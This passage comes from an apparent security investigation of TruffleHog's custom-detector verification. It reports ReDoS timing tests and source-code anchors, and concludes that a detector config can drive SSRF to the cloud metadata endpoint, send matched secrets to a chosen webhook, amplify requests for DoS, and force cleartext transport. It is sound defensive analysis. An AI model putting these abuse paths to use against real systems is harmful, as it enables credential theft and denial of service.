The actual scan work is ~**27–31 ms** across three runs (stable); the ~1.8 s wall time is dominated by the binary's startup, not by regex evaluation. There is no blow-up. *(These are the measured values on this host; the exact milliseconds are volatile and machine-dependent, but the substantive result — tens of milliseconds, linear, 20 chunks, stable across runs — is what matters and is reproduced consistently.)*

### E5b — the same pattern on a backtracking engine (Python `re`) — the contrast *(supporting measurement)*

To show *why* RE2 matters, the identical pattern was run on Python's backtracking engine with an 8-second alarm:

```
$ python3 e5b_backtrack.py
n= 20:     81.511 ms
n= 24:   1317.715 ms
n= 26:   5390.249 ms
n= 28: >8000 ms  (ABORTED - catastrophic backtracking)
n= 30: >8000 ms  (ABORTED - catastrophic backtracking)
```

A backtracking engine hangs at just **28** characters of input. This is a *supporting* measurement (a different engine), not the canonical CLI answer; it exists only to characterize the danger RE2 avoids.

### E5c — attributing the safety to Go RE2 *(supporting standalone probe, go1.24.2)*

A standalone Go program compiling the same `(a+)+$` with `regexp` and running it against growing inputs:

```
$ go run e5c_probe.go
n=    1000:    0.133 ms
n=   10000:    0.708 ms
n=  100000:    4.248 ms
n= 1000000:   43.046 ms
n= 5000000:  222.172 ms
regexp.Compile(`(a)\1`) -> ERROR: error parsing regexp: invalid escape sequence: `\1`
```

Ten-times the input yields roughly ten-times the time — **linear** scaling — and a backreference (`\1`) is rejected outright, confirming RE2 semantics. This is a *supporting* standalone measurement of the same engine TruffleHog uses (not the CLI itself).

### E5d — invalid backreference rejected at LOAD via the real CLI

```
$ ./trufflehog filesystem --config=e5d_bref.yml --no-update --no-color <dir>
2026-07-08T05:03:48Z	error	trufflehog	error parsing the provided configuration file	{"error": "regex 'bref': error parsing regexp: invalid escape sequence: `\\1`"}
```

This matches `ValidateRegex` wrapping `regexp.Compile` (`pkg/custom_detectors/validation.go:L23-L33`): an unsupported (backreference) pattern is caught at config load, before any scanning.

### E5e — matched secret bounded by `MaxSecretSize = 1000`

A file containing `hog secret=` followed by 5,000 `z` characters, with regex `secret=([a-z]+)`:

```
$ ./trufflehog filesystem --config=e5e_size.yml --no-update --no-color --no-verification /tmp/thog_lab/e5/sizetarget
Raw result length observed = 989 chars (input secret was 5000 z's)
```

The reported secret is **989** characters, not 5,000 — bounded by `MaxSecretSize` (`pkg/custom_detectors/custom_detectors.go:L180-L182`), which caps the extracted match at ~1000 bytes.

### ⚠️ Grounded correction — detector-scan timeout is 10 s, not 5 s

There are **two distinct constants named `DefaultResponseTimeout`** in different packages, and they must not be conflated:

```
$ sed -n '37p' pkg/engine/engine.go
var detectionTimeout = detectors.DefaultResponseTimeout
$ sed -n '18p' pkg/detectors/http.go
const DefaultResponseTimeout = 10 * time.Second
$ sed -n '1066,1067p' pkg/engine/engine.go
		ctx, cancel := context.WithTimeout(ctx, detectionTimeout)
		t := time.AfterFunc(detectionTimeout+1*time.Second, func() {

$ sed -n '209p' pkg/common/http.go
const DefaultResponseTimeout = 5 * time.Second
$ sed -n '223,228p' pkg/common/http.go
func SaneHttpClient() *http.Client {
	httpClient := &http.Client{}
	httpClient.Timeout = DefaultResponseTimeout
	httpClient.Transport = NewCustomTransport(saneTransport)
	return httpClient
}
```

- The **per-detector, per-chunk scan backstop** is **10 s**: `engine.go:L37` `detectionTimeout = detectors.DefaultResponseTimeout` resolves to `detectors/http.go:L18` `DefaultResponseTimeout = 10 * time.Second`, and is applied via `context.WithTimeout(ctx, detectionTimeout)` at `engine.go:L1066` (with a warning `AfterFunc` at `L1067`; overridable via `--detector-timeout` / `SetDetectorTimeout`, `engine.go:L331`).
- The **verification HTTP-client** timeout is a *separate* **5 s** constant: `common/http.go:L209` `DefaultResponseTimeout = 5 * time.Second`, used by `SaneHttpClient` (`common/http.go:L225`).

The AAP text attributes the detector-scan timeout to `common/http.go:L209` (5 s); that is inaccurate — `L209` is the HTTP-client timeout, while the detector-scan backstop is the **10 s** constant in `detectors/http.go:L18`. (The 5 s HTTP-client timeout was, incidentally, observed empirically in the Q3 pre-fix diagnostic, where dropped connections produced `scan_duration: 5.019226192s`.) This correction is a direct product of the run-first / grounding rule catching a specification inaccuracy.

**Reasoning / nuance.** Regex is **not** the abuse vector here: RE2 neutralizes ReDoS by construction, and an unsupported pattern is rejected at load. The only regex-adjacent limits worth noting are the absence of an explicit pattern length/complexity cap (mitigated entirely by RE2's linear-time guarantee) and the 1000-byte cap on the extracted secret.

---


## Q6 — Overall abuse conclusion

> *"Could someone with control over a detector configuration abuse the verification system in ways we haven't anticipated?"*

**Direct answer: YES.** A party who controls a custom-detector configuration can abuse the verification system in several ways an operator is unlikely to have anticipated. Synthesizing the five experiments:

1. **SSRF, including the cloud metadata endpoint (E1 / Q1).** There is no host/IP/metadata validation; `ValidateVerifyEndpoint` (`pkg/custom_detectors/validation.go:L35-L44`) checks only non-empty + http-requires-unsafe, and the raw endpoint is dialed at `custom_detectors.go:L228`. Verification requests were observed reaching `127.0.0.1` internal paths and the real link-local metadata IP `169.254.169.254` — a credential-theft pivot in cloud/CI.

2. **Secret exfiltration (E4 / Q4).** The webhook body is the **raw detected secret(s)** in JSON, sent to the attacker-chosen endpoint with attacker-chosen headers. A malicious config that matches an organization's real secrets ships them out under the cover of "verification."

3. **Request amplification / DoS (E3 / Q3).** Verification fires once per match-permutation (cartesian product), capped at 100 **per chunk** with **no global cap** and **unbounded concurrency**. A crafted input produces `#chunks × up to 100` outbound requests (309 observed from a single 600-match file across 4 chunks), fired in bursts of up to 100 simultaneous connections — usable to flood a chosen victim.

4. **Transport downgrade / MITM (E2 / Q2).** HTTPS endpoints get full default certificate verification (forged-cert MITM is rejected), but the config author can force **cleartext** with `unsafe: true` (secret + headers observed in the clear), and there is **no certificate pinning** — trust rests on the system CA store.

5. **Silent config misinterpretation (E4c / Q4).** `successRanges` (and `ValidateVerifyRanges` / `ValidateRegexVars`) are defined in the schema/validation code but **never wired** into `NewWebhookCustomRegex` (`custom_detectors.go:L40-L60`); only HTTP 200 verifies. An operator's configured expectations can silently diverge from actual behavior.

6. **Regex is NOT the abuse vector (E5 / Q5).** Go's RE2 engine makes ReDoS a non-issue (linear time, no backreferences), and invalid patterns are rejected at load. This is the one area that is safe by construction.

**Bottom line.** The implicit trust boundary — *"a detector configuration is just a set of patterns"* — is false. A config author also controls an **outbound HTTP client** (destination host, URL scheme, request headers) and **receives the matched secrets** in the request body. **Untrusted custom-detector configurations must be treated as untrusted code**, with the same scrutiny (or isolation) one would apply to running an unknown program with network egress and access to the secrets being scanned. *(This document reports behavior only; per scope it proposes no code remediation.)*

---

## Coverage pass — every named item, answered

| Named item | Answered? | Where | One-line result |
|------------|-----------|-------|-----------------|
| **SSRF** | ✅ | Q1 / E1a, E1b | No host validation; POST issued to arbitrary host. |
| **Metadata endpoint** (`169.254.169.254`) | ✅ | Q1 / E1b | TruffleHog dialed the real link-local metadata IP with an attacker path. |
| **TLS certificate validation** | ✅ | Q2 / E2a | Full default Go verification (`InsecureSkipVerify=false`); self-signed → handshake fails, secret never sent. |
| **MITM** | ✅ | Q2 / E2b, E2c | Forged-cert HTTPS rejected; but `unsafe` cleartext is interceptable and there is no pinning. |
| **Multiple patterns** | ✅ | Q3 / E3c | Cartesian product of matches — one POST per permutation (2×3 → 6). |
| **Request limits** | ✅ | Q3 / E3a, E3b | Capped at 100 **per chunk**; no global cap; unbounded concurrency (5→5, 150→100, 600/4-chunks→309). |
| **Webhook data** | ✅ | Q4 / E4a, E4b, E4c | POST of `{name:{regex:[fullMatch,capture]}}` + `User-Agent: TruffleHog` + user headers (first-colon split); only HTTP 200 verifies; `successRanges` ignored. |
| **Regex safeguards** | ✅ | Q5 / E5a–E5e | RE2 linear-time, no backrefs (ReDoS-immune); invalid rejected at load; `MaxSecretSize=1000`; 10 s detector-scan backstop. |

All six questions (Q1–Q6) are answered explicitly and by name in the sections above.

---

## Appendix — read-only source anchors (cited, never modified)

Every file below is a **read-only REFERENCE** for this investigation; none was modified. The single artifact added to the repository is this Markdown document.

| File | Anchors (verified on branch `trufflehog_e42153d44a5e`) |
|------|--------------------------------------------------------|
| `pkg/custom_detectors/custom_detectors.go` | `maxTotalMatches=100` `L23`; `httpClient = common.SaneHttpClient()` `L62`; `FromData` `L64`; regex compile in scan `L91-L97`; `permutateMatches` `L110`, `L317-L343`; `errgroup` (no `SetLimit`) `L112`, `L155-L158`; `MaxSecretSize=1000` `L180-L182`; JSON body `L213-L216`; POST to raw endpoint `L228`; header split-on-first-colon `L232-L239`; 200-only success `L249`; response truncation `L259-L266`; `NewWebhookCustomRegex` `L40-L60` |
| `pkg/custom_detectors/validation.go` | `ValidateRegex` `L23-L33`; `ValidateVerifyEndpoint` `L35-L44`; `ValidateVerifyHeaders` `L46-L53`; `ValidateVerifyRanges` (defined, unwired) `L55-L97`; `ValidateRegexVars` (defined, unwired) `L99-L108` |
| `pkg/custom_detectors/CUSTOM_DETECTORS.md` | verify schema/example `L15-L45`; verification-server examples `L95-L209` |
| `proto/custom_detectors.proto` | `VerifierConfig { endpoint (1), unsafe (2), headers (3), successRanges (4) }` |
| `pkg/common/http.go` | `UserAgent()` `L92-L97`; UA injection `L100`; `PinnedRetryableHttpClient` (pinning, unused by custom detectors) `L159-L178`; `DefaultResponseTimeout = 5s` `L209`; `saneTransport` (no `TLSClientConfig`) `L211-L221`; `SaneHttpClient` `L223-L228` |
| `pkg/config/config.go` | `Read` `L18`; `NewYAML` `L27`; `protoyaml.UnmarshalStrict` `L30`; `NewWebhookCustomRegex` `L36` |
| `pkg/engine/engine.go` | `detectionTimeout = detectors.DefaultResponseTimeout` `L37`; `SetDetectorTimeout` `L331`; `context.WithTimeout` `L1066` + `AfterFunc` `L1067` |
| `pkg/detectors/http.go` | `DefaultResponseTimeout = 10 * time.Second` `L18` (the detector-scan timeout value) |
| `pkg/sources/chunker.go` | `ChunkSize = 10*1024` `L14`; `PeekSize = 3*1024` `L16` |
| `main.go` | `--no-verification` `L59`; `--config` `L70`; `--verifier` `L75`; `--custom-verifiers-only` `L76`; `--detector-timeout` `L77`; `filesystem` command `L143-L144` |
| `examples/generic.yml` | canonical detector config format `L1-L16` |
| `examples/README.md` | canonical invocation `L10` |
| `Dockerfile` | `ENV CGO_ENABLED=0` `L5`; `go build -o trufflehog .` `L9` (RUN spans `L7-L9`) |
| `go.mod` | `toolchain go1.24.2` `L4` |

---

## Cleanup confirmation

- All temporary detector configs, target files, capture servers, and the self-signed certificate were created **outside** the repository, under `/tmp/thog_lab`, and are removed at the end of the investigation.
- The `169.254.169.254` loopback alias (`lo:9`) used in E1b is an ephemeral, non-repository container network setting; it is not a repository artifact and is removed at cleanup.
- All secrets used in every experiment are **synthetic** (e.g., `AKIAIOSFODNN7EXAMPLEZ1234567890abcdEXAMPLE`, `SYNTHETIC-MITM-TOKEN-abc123`) and match no real credential.
- The compiled `trufflehog` binary is `.gitignore`'d and does not affect repository state.
- After the investigation, `git status --porcelain` reports only this single new documentation file; no existing source file was modified. The repository is otherwise byte-for-byte unchanged.

